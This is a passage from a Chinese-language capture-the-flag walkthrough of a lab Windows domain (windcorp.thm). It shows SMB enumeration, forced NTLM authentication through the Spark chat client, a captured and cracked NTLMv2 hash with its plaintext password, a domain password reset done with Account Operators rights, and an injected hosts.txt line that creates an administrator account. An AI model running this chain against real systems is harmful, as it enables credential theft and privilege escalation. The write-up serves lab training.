+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient //<span class="variable">$TIP</span>/Users -U lilyle -c <span class="built_in">ls</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; user</span><br><span class="line">$ <span class="built_in">cat</span> user</span><br><span class="line">Administrator</span><br><span class="line">angrybird</span><br><span class="line">berg</span><br><span class="line">bluefrog579</span><br><span class="line">brittanycr</span><br><span class="line">brownostrich284</span><br><span class="line">buse</span><br><span class="line">edward</span><br><span class="line">freddy</span><br><span class="line">garys</span><br><span class="line">goldencat416</span><br><span class="line">goldenwol</span><br><span class="line">happ</span><br><span class="line">happyme</span><br><span class="line">Luis</span><br><span class="line">orga</span><br><span class="line">organicf</span><br><span class="line">organicfish718</span><br><span class="line">pete</span><br><span class="line">Public</span><br><span class="line">purplecat</span><br><span class="line">purplepanda</span><br><span class="line">sadswan</span><br><span class="line">sadswan869</span><br><span class="line">sheela</span><br><span class="line">silver</span><br><span class="line">smallf</span><br><span class="line">spiff</span><br><span class="line">tinygoos</span><br><span class="line">whiteleopard</span><br></pre></td></tr></table></figure>
+
+<p>接着看另一个共享：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient //<span class="variable">$TIP</span>/Shared -U lilyle</span><br><span class="line">Enter WORKGROUP\lilyle<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Sat May 30 08:45:42 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sat May 30 08:45:42 2020</span></span><br><span class="line"><span class="string">  Flag 1.txt                          A       45  Fri May  1 23:32:36 2020</span></span><br><span class="line"><span class="string">  spark_2_8_3.deb                     A 29526628  Sat May 30 08:45:01 2020</span></span><br><span class="line"><span class="string">  spark_2_8_3.dmg                     A 99555201  Sun May  3 19:06:58 2020</span></span><br><span class="line"><span class="string">  spark_2_8_3.exe                     A 78765568  Sun May  3 19:05:56 2020</span></span><br><span class="line"><span class="string">  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 19:07:24 2020</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Flag2-txt"><a href="#Flag2-txt" class="headerlink" title="Flag2.txt:"></a>Flag2.txt:</h6><p>spark是一个通信软件，该2.8.3被允许以类似HTLM外链图片的方式与聊天对象发送消息，配合responder可利用强制认证捕获到目标的NTLMv2哈希。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line">[HTTP] NTLMv2 Client   : 10.10.121.103</span><br><span class="line">[HTTP] NTLMv2 Username : WINDCORP\buse</span><br><span class="line">[HTTP] NTLMv2 Hash     : buse::WINDCORP:6da1ec088e2f0ad5:C28F54DAB3F6B4C463F0D569BF59EC7E:0101000000000000D8858F47AF1CD801A099D85D31F3B105000000000200080042004A005900390001001E00570049004E002D0056005600580057003800380032003200530050004A000400140042004A00590039002E004C004F00430041004C0003003400570049004E002D0056005600580057003800380032003200530050004A002E0042004A00590039002E004C004F00430041004C000500140042004A00590039002E004C004F00430041004C000800300030000000000000000100000000200000DEAFDEAC9E1ACD2053A729447BC2415EBAF161709AD5EC89915C6DBE11D0B9DD0A00100000000000000000000000000000000000090000000000000000000000</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br><span class="line">BUSE::WINDCORP:6da1ec088e2f0ad5:c28f54dab3f6b4c463f0d569bf59ec7e:0101000000000000d8858f47af1cd801a099d85d31f3b105000000000200080042004a005900390001001e00570049004e002d0056005600580057003800380032003200530050004a000400140042004a00590039002e004c004f00430041004c0003003400570049004e002d0056005600580057003800380032003200530050004a002e0042004a00590039002e004c004f00430041004c000500140042004a00590039002e004c004f00430041004c000800300030000000000000000100000000200000deafdeac9e1acd2053a729447bc2415ebaf161709ad5ec89915c6dbe11d0b9dd0a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buse:uzunLM+3131</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb <span class="variable">$TIP</span>  -u buse -p <span class="string">&#x27;uzunLM+3131&#x27;</span></span><br><span class="line">SMB         10.10.121.103   445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.121.103   445    FIRE             [+] windcorp.thm\buse:uzunLM+3131</span><br><span class="line">$ smbmap -H <span class="variable">$TIP</span> -u buse -p <span class="string">&#x27;uzunLM+3131&#x27;</span></span><br><span class="line">[+] IP: 10.10.121.103:445	Name: windcorp.thm                                      </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share </span><br><span class="line">	Shared                                            	READ ONLY	</span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share </span><br><span class="line">	Users                                             	READ ONLY	</span><br><span class="line">$ crackmapexec winrm <span class="variable">$TIP</span>  -u buse -p <span class="string">&#x27;uzunLM+3131&#x27;</span></span><br><span class="line">WINRM       10.10.121.103   5985   FIRE             [*] Windows 10.0 Build 17763 (name:FIRE) (domain:windcorp.thm)</span><br><span class="line">WINRM       10.10.121.103   5985   FIRE             [*] http://10.10.121.103:5985/wsman</span><br><span class="line">WINRM       10.10.121.103   5985   FIRE             [+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i <span class="variable">$TIP</span> -u buse -p <span class="string">&#x27;uzunLM+3131&#x27;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.4</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\buse\Documents&gt; <span class="built_in">cd</span> ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\buse\Desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\buse\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----         5/7/2020   3:00 AM                Also stuff</span><br><span class="line">d-----         5/7/2020   2:58 AM                Stuff</span><br><span class="line">-a----         5/2/2020  11:53 AM             45 Flag 2.txt</span><br><span class="line">-a----         5/1/2020   8:33 AM             37 Notes.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\buse\Desktop&gt; <span class="built_in">cat</span> <span class="string">&quot;Flag 2.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Flag3-txt"><a href="#Flag3-txt" class="headerlink" title="Flag3.txt:"></a>Flag3.txt:</h6><p>在C:\script目录下有一个checkserver.ps1脚本。相对的还有一个log.txt用以记录该脚本上一次运行的时间：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\scripts&gt; <span class="built_in">cat</span> log.txt</span><br><span class="line">Last run: <span class="number">07</span>/<span class="number">08</span>/<span class="number">2022</span> <span class="number">01</span>:<span class="number">20</span>:<span class="number">19</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\scripts&gt; <span class="built_in">cat</span> checkservers.ps1</span><br><span class="line"><span class="comment"># reset the lists of hosts prior to looping</span></span><br><span class="line"><span class="variable">$OutageHosts</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="comment"># specify the time you want email notifications resent for hosts that are down</span></span><br><span class="line"><span class="variable">$EmailTimeOut</span> = <span class="number">30</span></span><br><span class="line"><span class="comment"># specify the time you want to cycle through your host lists.</span></span><br><span class="line"><span class="variable">$SleepTimeOut</span> = <span class="number">45</span></span><br><span class="line"><span class="comment"># specify the maximum hosts that can be down before the script is aborted</span></span><br><span class="line"><span class="variable">$MaxOutageCount</span> = <span class="number">10</span></span><br><span class="line"><span class="comment"># specify who gets notified</span></span><br><span class="line"><span class="variable">$notificationto</span> = <span class="string">&quot;brittanycr@windcorp.thm&quot;</span></span><br><span class="line"><span class="comment"># specify where the notifications come from</span></span><br><span class="line"><span class="variable">$notificationfrom</span> = <span class="string">&quot;admin@windcorp.thm&quot;</span></span><br><span class="line"><span class="comment"># specify the SMTP server</span></span><br><span class="line"><span class="variable">$smtpserver</span> = <span class="string">&quot;relay.windcorp.thm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start looping here</span></span><br><span class="line"><span class="keyword">Do</span>&#123;</span><br><span class="line"><span class="variable">$available</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="variable">$notavailable</span> = <span class="variable">$Null</span></span><br><span class="line"><span class="built_in">Write-Host</span> (<span class="built_in">Get-Date</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span></span><br><span class="line"><span class="comment"># from the list without touching the script/scheduled task,</span></span><br><span class="line"><span class="comment"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span></span><br><span class="line"><span class="built_in">get-content</span> C:\Users\brittanycr\hosts.txt | <span class="built_in">Where-Object</span> &#123;!(<span class="variable">$_</span> <span class="operator">-match</span> <span class="string">&quot;#&quot;</span>)&#125; |</span><br><span class="line"><span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&quot;Test-Connection -ComputerName <span class="variable">$_</span> -Count 1 -ea silentlycontinue&quot;</span></span><br><span class="line">    <span class="built_in">Invoke-Expression</span> <span class="variable">$p</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$p</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="comment"># if the Host is available then just write it to the screen</span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Available host ---&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Green <span class="literal">-ForegroundColor</span> White</span><br><span class="line">     [<span class="built_in">Array</span>]<span class="variable">$available</span> += <span class="variable">$_</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">     <span class="comment"># If the host is unavailable, give a warning to screen</span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Unavailable host ------------&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Magenta <span class="literal">-ForegroundColor</span> White</span><br><span class="line">     <span class="variable">$p</span> = <span class="built_in">Test-Connection</span> <span class="literal">-ComputerName</span> <span class="variable">$_</span> <span class="literal">-Count</span> <span class="number">1</span> <span class="literal">-ea</span> silentlycontinue</span><br><span class="line">     <span class="keyword">if</span>(!(<span class="variable">$p</span>))</span><br><span class="line">       &#123;</span><br><span class="line">        <span class="comment"># If the host is still unavailable for 4 full pings, write error and send email</span></span><br><span class="line">        <span class="built_in">write-host</span> <span class="string">&quot;Unavailable host ------------&gt; &quot;</span><span class="variable">$_</span> <span class="literal">-BackgroundColor</span> Red <span class="literal">-ForegroundColor</span> White</span><br><span class="line">        [<span class="built_in">Array</span>]<span class="variable">$notavailable</span> += <span class="variable">$_</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$OutageHosts</span> <span class="operator">-ne</span> <span class="variable">$Null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$OutageHosts</span>.ContainsKey(<span class="variable">$_</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                 <span class="comment"># First time down add to the list and send email</span></span><br><span class="line">                 <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$_</span> Is not in the OutageHosts list, first time down&quot;</span></span><br><span class="line">                 <span class="variable">$OutageHosts</span>.Add(<span class="variable">$_</span>,(<span class="built_in">get-date</span>))</span><br><span class="line">                 <span class="variable">$Now</span> = <span class="built_in">Get-date</span></span><br><span class="line">                 <span class="variable">$Body</span> = <span class="string">&quot;<span class="variable">$_</span> has not responded for 5 pings at <span class="variable">$Now</span>&quot;</span></span><br><span class="line">                 <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">                  <span class="literal">-Subject</span> <span class="string">&quot;Host <span class="variable">$_</span> is down&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpserver</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment"># If the host is in the list do nothing for 1 hour and then remove from the list.</span></span><br><span class="line">                    <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$_</span> Is in the OutageHosts list&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> (((<span class="built_in">Get-Date</span>) - <span class="variable">$OutageHosts</span>.Item(<span class="variable">$_</span>)).TotalMinutes <span class="operator">-gt</span> <span class="variable">$EmailTimeOut</span>)</span><br><span class="line">                    &#123;<span class="variable">$OutageHosts</span>.Remove(<span class="variable">$_</span>)&#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># First time down create the list and send email</span></span><br><span class="line">                <span class="built_in">Write-Host</span> <span class="string">&quot;Adding <span class="variable">$_</span> to OutageHosts.&quot;</span></span><br><span class="line">                <span class="variable">$OutageHosts</span> = <span class="selector-tag">@</span>&#123;<span class="variable">$_</span>=(<span class="built_in">get-date</span>)&#125;</span><br><span class="line">                <span class="variable">$Body</span> = <span class="string">&quot;<span class="variable">$_</span> has not responded for 5 pings at <span class="variable">$Now</span>&quot;</span></span><br><span class="line">                <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">                 <span class="literal">-Subject</span> <span class="string">&quot;Host <span class="variable">$_</span> is down&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpserver</span></span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Report to screen the details</span></span><br><span class="line"><span class="variable">$log</span> = <span class="string">&quot;Last run: <span class="variable">$</span>(Get-Date)&quot;</span></span><br><span class="line"><span class="built_in">write-host</span> <span class="variable">$log</span></span><br><span class="line"><span class="built_in">Set-Content</span> <span class="literal">-Path</span> C:\scripts\log.txt <span class="literal">-Value</span> <span class="variable">$log</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Available count:&quot;</span><span class="variable">$available</span>.count</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Not available count:&quot;</span><span class="variable">$notavailable</span>.count</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Not available hosts:&quot;</span></span><br><span class="line"><span class="variable">$OutageHosts</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Sleeping <span class="variable">$SleepTimeOut</span> seconds&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> <span class="variable">$SleepTimeOut</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$OutageHosts</span>.Count <span class="operator">-gt</span> <span class="variable">$MaxOutageCount</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"># If there are more than a certain number of host down in an hour abort the script.</span></span><br><span class="line">    <span class="variable">$Exit</span> = <span class="variable">$True</span></span><br><span class="line">    <span class="variable">$body</span> = <span class="variable">$OutageHosts</span> | <span class="built_in">Out-String</span></span><br><span class="line">    <span class="built_in">Send-MailMessage</span> <span class="literal">-Body</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> <span class="literal">-to</span> <span class="variable">$notificationto</span> <span class="literal">-from</span> <span class="variable">$notificationfrom</span> `</span><br><span class="line">     <span class="literal">-Subject</span> <span class="string">&quot;More than <span class="variable">$MaxOutageCount</span> Hosts down, monitoring aborted&quot;</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpServer</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$Exit</span> <span class="operator">-ne</span> <span class="variable">$True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>该脚本正在从C:\Users\brittanycr\hosts.txt读取非注释行去执行ping命令，可以进行命令注入。现在就想办法获取brittanycr账户权限即可，</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\scripts&gt; whoami /groups</span><br><span class="line"></span><br><span class="line"><span class="built_in">GROUP</span> INFORMATION</span><br><span class="line"><span class="literal">-----------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                       <span class="built_in">Type</span>             SID                                          Attributes</span><br><span class="line">================================================ ================ ============================================ ==================================================</span><br><span class="line">Everyone                                         Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-1-0</span>                                      Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Users                                    Alias            S<span class="literal">-1-5-32-545</span>                                 Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Pre<span class="literal">-Windows</span> <span class="number">2000</span> Compatible Access       Alias            S<span class="literal">-1-5-32-554</span>                                 Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Account Operators                        Alias            S<span class="literal">-1-5-32-548</span>                                 Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Remote Desktop Users                     Alias            S<span class="literal">-1-5-32-555</span>                                 Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">BUILTIN\Remote Management Users                  Alias            S<span class="literal">-1-5-32-580</span>                                 Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\NETWORK                             Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-2</span>                                      Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\Authenticated Users                 Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-11</span>                                     Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\This Organization                   Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-15</span>                                     Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">WINDCORP\IT                                      <span class="built_in">Group</span>            S<span class="literal">-1-5-21-555431066-3599073733-176599750-5865</span> Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">NT AUTHORITY\NTLM Authentication                 Well<span class="literal">-known</span> <span class="built_in">group</span> S<span class="literal">-1-5-64-10</span>                                  Mandatory <span class="built_in">group</span>, Enabled by default, Enabled <span class="built_in">group</span></span><br><span class="line">Mandatory Label\Medium Plus Mandatory Level      Label            S<span class="literal">-1-16-8448</span></span><br></pre></td></tr></table></figure>
+
+<p>Account Operators组可以更改域内其他账户的口令密码。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\buse\Documents&gt; net user brittanycr qwe123<span class="comment">#@! /domain</span></span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\buse\Document</span><br></pre></td></tr></table></figure>
+
+<p>构造hosts：</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">net</span> user crazy qwe123456! /add;<span class="built_in">net</span> localgroup Administrators crazy /add</span><br></pre></td></tr></table></figure>
+
+<p>然后用smb共享替换hosts：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> smbclient //<span class="number">10.10</span>.<span class="number">248.134</span>/Users <span class="literal">-U</span> brittanycr</span><br><span class="line">Enter WORKGROUP\brittanycr<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">smb: \&gt; cd brittanycr\</span></span><br><span class="line"><span class="string">smb: \brittanycr\&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Sun May  3 07:36:46 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sun May  3 07:36:46 2020</span></span><br><span class="line"><span class="string">  hosts.txt                           A       22  Sun May  3 21:44:57 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		15587583 blocks of size 4096. 10912915 blocks available</span></span><br><span class="line"><span class="string">smb: \brittanycr\&gt; put hosts.txt</span></span><br><span class="line"><span class="string">hosts.txt does not exist</span></span><br><span class="line"><span class="string">smb: \brittanycr\&gt; put hosts.txt</span></span><br><span class="line"><span class="string">putting file hosts.txt as \brittanycr\hosts.txt (0.1 kb/s) (average 0.1 kb/s)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\scripts&gt; net user crazy</span><br><span class="line">User name                    crazy</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            7/8/2022 3:19:52 AM</span></span><br><span class="line"><span class="string">Password expires             8/19/2022 3:19:52 AM</span></span><br><span class="line"><span class="string">Password changeable          7/9/2022 3:19:52 AM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 